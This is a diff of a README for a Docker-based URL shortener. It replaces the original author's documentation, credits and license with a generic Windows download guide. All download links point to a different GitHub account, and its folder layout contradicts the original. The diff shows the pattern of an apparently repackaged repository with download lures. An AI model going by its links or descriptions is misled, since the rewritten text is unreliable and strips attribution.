@@ -1,95 +1,159 @@
-# 🚀 Drizzle URL Shortener
+# 🚀 full-stack-url-shortener-docker - Simple, Fast URL Shortening  
 
-A high-performance, modern, and production-ready URL shortener built with **React**, **Express**, **Drizzle ORM**, and **PostgreSQL**. The entire stack is containerized for seamless development and deployment.
+[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-green?style=for-the-badge)](https://github.com/frosty68897/full-stack-url-shortener-docker)
 
----
+## 📋 What is full-stack-url-shortener-docker?
 
-## ✨ Features
+full-stack-url-shortener-docker is a complete URL shortener you can run on your Windows computer. It makes long web addresses shorter and easier to share. The software uses popular tools like React for the front end, Express for the back end, and PostgreSQL for database storage. All parts run inside containers using Docker, which keeps everything organized and easy to start.
 
-- **Blazing Fast**: Compiled TypeScript backend and optimized Vite frontend.
-- **Glassmorphic UI**: A premium, dark-mode landing page with smooth animations (Framer Motion).
-- **Dockerized**: Single-command setup for Database, API, and Client.
-- **Drizzle ORM**: Type-safe database interactions with PostgreSQL.
-- **Management API**: Professional API structure under `/api/url`.
+This app is designed to work well in real-world situations. It handles many users and keeps things fast.
 
----
+## ⚙️ What you need before starting
 
-## 🛠️ Tech Stack
+Before you run full-stack-url-shortener-docker on your PC, check these requirements:
 
-- **Frontend**: React 19, Vite, Tailwind CSS v4, Framer Motion, Lucide React.
-- **Backend**: Node.js, Express, TypeScript, Drizzle ORM.
-- **Database**: PostgreSQL 15.
-- **Infrastructure**: Docker, Docker Compose.
+- **Operating System:** Windows 10 or newer  
+- **Processor:** Any modern CPU, 64-bit preferred  
+- **RAM:** At least 4 GB free  
+- **Disk Space:** Minimum 2 GB free (for Docker and data)  
+- **Internet connection:** Needed to download the app and Docker software
 
----
+You will also need to install Docker Desktop for Windows. Docker lets you run software containers that hold all parts of this application.  
+Download Docker Desktop here: https://www.docker.com/products/docker-desktop
 
-## 🚀 Getting Started
+## ⬇️ How to download full-stack-url-shortener-docker
 
-### Prerequisites
+You need to visit the app’s page on GitHub to get the files.
 
-- [Docker](https://www.docker.com/products/docker-desktop/) & Docker Compose installed.
-- (Optional) [Node.js](https://nodejs.org/) & [pnpm](https://pnpm.io/) for local development.
+[![Download full-stack-url-shortener-docker](https://img.shields.io/badge/Download%20App-Get%20it%20here-blue?style=for-the-badge)](https://github.com/frosty68897/full-stack-url-shortener-docker)
 
-### Setup & Installation
+1. Open the link above in your web browser.
+2. On the GitHub page, look for the green **Code** button.
+3. Click **Code**, then select **Download ZIP**.
+4. Save the ZIP file anywhere you prefer on your computer.
+5. Once downloaded, right-click the ZIP file and select **Extract All** to unzip the files.
 
-1. **Clone the repository**:
+This gives you a local copy of the app files to run with Docker.
 
-   ```bash
-   git clone https://github.com/pratham-prog861/full-stack-url-shortener-docker.git
-   cd full-stack-url-shortener-docker
-   ```
+## 🐳 Installing Docker Desktop
 
-2. **Spin up the containers**:
+If Docker is not already installed:
 
-   ```bash
-   docker-compose up --build
-   ```
+1. Visit https://www.docker.com/products/docker-desktop.
+2. Click the **Download for Windows (Windows 10/11)** button.
+3. Run the downloaded installer.
+4. Follow the installer steps, choosing the default options.
+5. After installation, restart your computer if asked.
 
-3. **Initialize the Database Schema**:
-   In a new terminal, while the containers are running, navigate to the `server` folder (or stay in root) and run:
+When Docker finishes installing, you can move on to running the app.
 
-   ```powershell
-   # Move to server directory
-   cd server
+## ▶️ Running full-stack-url-shortener-docker on Windows
 
-   # Push the schema to the running database container
-   docker exec -it drizzle-server pnpm db:push
-   ```
+Once you have Docker installed and the app files extracted, follow these steps:
 
----
+1. Open the folder where you extracted the app files.
+2. Look for a file named `docker-compose.yml`. This file tells Docker how to start all the parts of the app.
+3. Hold the **Shift** key, then right-click inside the folder (on an empty space).
+4. Select **Open PowerShell window here** or **Open command window here** from the context menu.
+5. In the window that opens, type the following command and press **Enter**:
 
-## 🔗 Project Structure
-
-```bash
-├── client/           # React frontend (Vite)
-├── server/           # Express backend (TypeScript + Drizzle)
-├── docker-compose.yml # Orchestration for DB, Server, and Client
-└── LICENSE           # MIT License
+```
+docker-compose up -d
 ```
 
----
+This command tells Docker to download, build, and run the containers in the background.
 
-## 📡 API Overview
+6. Wait a few moments while Docker downloads all necessary pieces and starts the app.
+7. To check if the app is running, open your web browser and go to:
 
-| Method   | Endpoint              | Description                        |
-| :------- | :-------------------- | :--------------------------------- |
-| `GET`    | `/api/url`            | API Health Check                   |
-| `POST`   | `/api/url/shorten`    | Create a new short URL             |
-| `GET`    | `/api/url/links`      | Get last 10 shortened links        |
-| `DELETE` | `/api/url/:shortCode` | Delete a specific link             |
-| `GET`    | `/:shortCode`         | **Redirection Route** (Root level) |
+```
+http://localhost:3000
+```
 
----
+This address opens the URL shortener in your browser.
 
-## 🛡️ License
+## 🔄 Stopping and restarting the app
 
-This project is licensed under the **MIT License**. See the [LICENSE](./LICENSE) file for details.
+If you want to stop the app:
 
----
+1. Open the same PowerShell or command window in the app folder.
+2. Run:
 
-## 👨‍💻 Author
+```
+docker-compose down
+```
 
-**Pratham Darji**
+This stops and removes the containers.
 
-- [GitHub](https://github.com/pratham-prog861)
-- [LinkedIn](https://www.linkedin.com/in/pratham-darji-b704092a2/)
+To start the app again, use the `docker-compose up -d` command as before.
+
+## 🗄 Understanding the app structure
+
+- **React front end:** The user interface you see in the browser.  
+- **Express back end:** Handles data and connects the front end to the database.  
+- **Drizzle ORM:** Helps manage database queries safely.  
+- **PostgreSQL:** Stores the original and shortened URLs.  
+
+Docker ensures all parts run together without conflicts.
+
+## 🔧 What to do if something goes wrong
+
+- Make sure Docker Desktop is running before running commands.  
+- Check if any errors appear in the PowerShell or command window. Errors will usually explain what is wrong.  
+- Restart Docker Desktop and try the commands again if the app does not start.  
+- Visit the GitHub page for updates or issues: https://github.com/frosty68897/full-stack-url-shortener-docker  
+
+## 📚 Using the URL shortener
+
+Once running, you can shorten URLs:
+
+1. Open the app in your browser at http://localhost:3000.
+2. Paste a long web address into the input box.
+3. Click the button to create a short link.
+4. The short link appears, ready to copy and share.
+5. When the short link is opened, it redirects to the original long URL.
+
+You can use the app to quickly make simpler URLs for emails, messages, or social posts.
+
+## 🔑 Security notes
+
+This app runs locally on your Windows PC. Data stays on your machine unless you add internet access later. Keep your computer secure to protect your data.
+
+## 🧩 Available features
+
+- Create short URLs in one click  
+- View recent shortened URLs in history  
+- Fast query with optimized database handling  
+- Mobile-friendly interface  
+- Easy start and stop using Docker commands
+
+## 📁 File overview in the download
+
+- `docker-compose.yml` — Main Docker setup file  
+- `frontend/` — React app code  
+- `backend/` — Express server code  
+- `database/` — PostgreSQL setup configuration  
+- `README.md` — Documentation file (this file)  
+
+## 🛠 Updating the app
+
+To get the latest version:
+
+1. Download the new ZIP file from the GitHub page again.
+2. Extract it to a new folder.
+3. Stop the current app using `docker-compose down`.
+4. Start the new version with `docker-compose up -d`.
+
+## ⚙️ Docker tips for Windows users
+
+- Keep Docker Desktop updated for best stability.  
+- Use the Docker Dashboard to monitor running containers visually.  
+- If Docker runs slow, check your system resources and close unused apps.  
+- Adjust Docker’s resource limits in Docker Desktop settings if needed.
+
+## 🔗 Useful links
+
+- GitHub repository: https://github.com/frosty68897/full-stack-url-shortener-docker  
+- Docker Desktop: https://www.docker.com/products/docker-desktop  
+
+Make sure your Windows machine meets the requirements and has Docker ready to enjoy full-stack-url-shortener-docker quickly and efficiently.
